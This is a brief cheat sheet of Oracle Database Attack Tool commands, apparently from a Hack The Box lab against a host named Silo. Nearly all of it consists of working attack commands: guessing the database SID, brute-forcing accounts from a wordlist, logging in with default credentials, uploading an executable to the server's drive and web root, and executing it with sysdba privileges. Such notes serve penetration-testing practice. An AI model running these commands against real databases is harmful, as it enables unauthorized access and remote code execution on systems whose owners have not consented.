# Tools
-  [Oracle Database Attack Tool (ODAT)](https://github.com/quentinhardy/odat)
```
All checks:
./odat.py all -s 10.10.10.82 -p 1521
./odat.py all -s 10.10.10.82 -d XE -U scott -P tiger


Gusss SID: 
./odat.py sidguesser -s 10.10.10.82

Guess passwords:
./odat.py passwordguesser -d XE -s 10.10.10.82 -p 1521 --accounts-file /root/HTB/tools/db/odat/accounts/accounts.txt

Guess login: 
use admin/oracle/oracle_login

Upload file:
./odat.py utlfile -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --putFile c:/ writeup.exe ~/HTB/silo/writeup.exe
./odat.py dbmsxslprocessor -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --putFile "c:\\inetpub\\wwwroot" "File-Test.txt" "/tmp/File-Test.txt"

Execute file:
./odat.py externaltable -d XE -s 10.10.10.82 -p 1521 -U scott -P tiger --sysdba --exec c:/ writeup.exe
```
